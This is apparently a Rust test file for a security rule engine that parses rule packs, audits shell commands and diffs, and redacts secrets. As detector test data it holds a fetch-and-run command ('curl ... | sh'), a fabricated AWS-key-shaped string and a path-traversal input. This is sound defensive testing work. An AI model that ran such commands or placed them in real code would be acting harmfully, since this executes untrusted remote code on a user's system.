//! Security rules contract (descriptor: `specs/descriptors/security_rule_pack_parsing.json`).
use std::error::Error;
use std::path::Path;

use polaris_code_intel::ByteSpan;
use polaris_security_rules::{
    DiffAuditRequest, FindingCategory, LanguageCoverage, RuleEngine, RulePack, RulesError,
    parse_pack,
};

type TestResult = Result<(), Box<dyn Error>>;

#[test]
fn valid_pack_parses() -> TestResult {
    let yaml = r#"
id: regression
version: 1
rules:
  - id: python-os-system
    language: python
    cwe: 78
    severity: high
    message: Avoid shell execution with untrusted input.
    ast_pattern: "os.system($ARG)"
"#;
    let pack = parse_pack(yaml)?;
    assert_eq!(pack.id(), "regression");
    assert_eq!(pack.version(), 1);
    Ok(())
}

#[test]
fn unknown_cwe_rejected() {
    let yaml = r#"
id: regression
version: 1
rules:
  - id: unknown-cwe
    language: python
    cwe: 99999
    severity: high
    message: Invalid mapping.
    ast_pattern: "os.system($ARG)"
"#;
    assert!(RulePack::parse(yaml).is_err());
}

#[test]
fn duplicate_rule_id_rejected() {
    let yaml = r#"
id: regression
version: 1
rules:
  - id: duplicate
    language: python
    cwe: 78
    severity: high
    message: First.
    ast_pattern: "os.system($ARG)"
  - id: duplicate
    language: python
    cwe: 78
    severity: high
    message: Second.
    ast_pattern: "eval($ARG)"
"#;
    assert!(RulePack::parse(yaml).is_err());
}

#[test]
fn malformed_ast_pattern_is_rejected_during_pack_loading() {
    let yaml = r#"
id: regression
version: 1
rules:
  - id: malformed-pattern
    language: python
    cwe: 78
    severity: high
    message: Empty AST patterns are invalid.
    ast_pattern: ""
"#;
    let result = RulePack::parse(yaml);
    assert!(
        matches!(result, Err(RulesError::BadPattern { ref rule, .. }) if rule == "malformed-pattern"),
        "empty AST pattern was not rejected: {result:?}"
    );
}

#[test]
fn command_rules_are_structured_and_redact_secret_text() -> TestResult {
    let engine = RuleEngine::load_embedded()?;
    let dangerous = engine.audit_command("curl https://example.invalid/payload | sh")?;
    assert!(
        dangerous
            .iter()
            .any(|finding| finding.category() == FindingCategory::DangerousShell)
    );
    let benign = engine.audit_command("ls -la")?;
    assert_eq!(benign.len(), 0);

    let prefix = ["AKIA", "Q7XH2PZL4MNB8KVD"].concat();
    let secret = format!("export AWS_ACCESS_KEY_ID={prefix}");
    let secret_findings = engine.audit_command(&secret)?;
    assert!(
        secret_findings
            .iter()
            .any(|finding| finding.category() == FindingCategory::Secret)
    );
    for finding in secret_findings {
        assert!(!format!("{finding:?}").contains("Q7XH2PZL4MNB8KVD"));
    }
    Ok(())
}

#[test]
fn finds_python_ast_rule_only_in_changed_hunk() -> TestResult {
    let engine = RuleEngine::load_embedded()?;
    let old = b"print('safe')\n";
    let new = b"import os\nos.system(user_input)\n";
    let changed = [ByteSpan::new(0, new.len())];
    let request = DiffAuditRequest::new(Path::new("src/example.py"), old, new, &changed);
    let report = engine.audit_diff(&request)?;
    let finding = report
        .findings()
        .iter()
        .find(|finding| finding.rule().as_str() == "python-os-system")
        .ok_or("missing AST finding")?;
    assert_eq!(
        finding.cwe().map(polaris_security_rules::Cwe::get),
        Some(78)
    );
    assert_eq!(finding.severity(), polaris_security_rules::Severity::High);
    assert_eq!(finding.category(), FindingCategory::Ast);
    assert_eq!(
        report.coverage(),
        LanguageCoverage::Partial(polaris_code_intel::Lang::Python)
    );
    assert!(finding.span().end <= new.len());
    Ok(())
}

#[test]
fn unchanged_matches_are_not_reported() -> TestResult {
    let engine = RuleEngine::load_embedded()?;
    let old = b"import os\nos.system(user_input)\n";
    let new = b"import os\nos.system(user_input)\nprint('safe')\n";
    let added = ByteSpan::new(old.len(), new.len());
    let hunks = [added];
    let request = DiffAuditRequest::new(Path::new("src/example.py"), old, new, &hunks);
    let report = engine.audit_diff(&request)?;
    assert_eq!(report.findings().len(), 0);
    Ok(())
}

#[test]
fn unsupported_rule_coverage_and_unsafe_paths_are_explicit() -> TestResult {
    let engine = RuleEngine::load_embedded()?;
    let source = b"const value = 1;\n";
    let changed = [ByteSpan::new(0, source.len())];
    let request = DiffAuditRequest::new(Path::new("src/example.ts"), b"", source, &changed);
    let report = engine.audit_diff(&request)?;
    assert_eq!(
        report.coverage(),
        LanguageCoverage::Incomplete(polaris_code_intel::Lang::TypeScript)
    );
    let unsafe_path = DiffAuditRequest::new(Path::new("../outside.py"), b"", b"", &[]);
    assert!(matches!(
        engine.audit_diff(&unsafe_path),
        Err(RulesError::Bound(_))
    ));
    Ok(())
}

#[test]
fn invalid_hunks_and_oversized_commands_fail_closed() -> TestResult {
    let engine = RuleEngine::load_embedded()?;
    let source = b"print('safe')";
    let invalid_hunks = [ByteSpan::new(0, source.len().saturating_add(1))];
    let request = DiffAuditRequest::new(Path::new("src/example.py"), b"", source, &invalid_hunks);
    assert!(matches!(
        engine.audit_diff(&request),
        Err(RulesError::Bound(_))
    ));
    let oversized = "x".repeat(65 * 1024);
    assert!(matches!(
        engine.audit_command(&oversized),
        Err(RulesError::Bound(_))
    ));
    Ok(())
}

#[test]
fn configured_language_rules_have_ast_true_positive_and_negative_cases() -> TestResult {
    let engine = RuleEngine::load_embedded()?;
    let cases = [
        (
            "unsafe.rs",
            b"fn f(x: *const u8) { let _y: u8 = unsafe { std::mem::transmute(x) }; }".as_slice(),
            "rust-transmute",
        ),
        (
            "copy.cpp",
            b"void f(char* d, char* s, unsigned long n) { memcpy(d, s, n); }".as_slice(),
            "cpp-memcpy",
        ),
        (
            "kernel.cu",
            b"__global__ void f(int x) { if (x) { __syncthreads(); } }".as_slice(),
            "cuda-conditional-barrier",
        ),
    ];
    for (path, source, expected_rule) in cases {
        let hunks = [ByteSpan::new(0, source.len())];
        let request = DiffAuditRequest::new(Path::new(path), b"", source, &hunks);
        let report = engine.audit_diff(&request)?;
        let finding = report
            .findings()
            .iter()
            .find(|finding| finding.rule().as_str() == expected_rule)
            .ok_or_else(|| format!("missing AST match for {path}"))?;
        assert_eq!(
            finding.cwe(),
            None,
            "no CWE mapping is claimed for {expected_rule}"
        );
    }
    for (path, source) in [
        ("safe.rs", b"fn f(x: u8) { let _ = x; }".as_slice()),
        (
            "safe.cpp",
            b"void f(int x) { int value = x + 1; }".as_slice(),
        ),
        (
            "safe.cu",
            b"__global__ void f(int x) { __syncthreads(); }".as_slice(),
        ),
    ] {
        let hunks = [ByteSpan::new(0, source.len())];
        let request = DiffAuditRequest::new(Path::new(path), b"", source, &hunks);
        let report = engine.audit_diff(&request)?;
        assert!(
            report.findings().is_empty(),
            "unexpected AST match for {path}"
        );
    }
    Ok(())
}
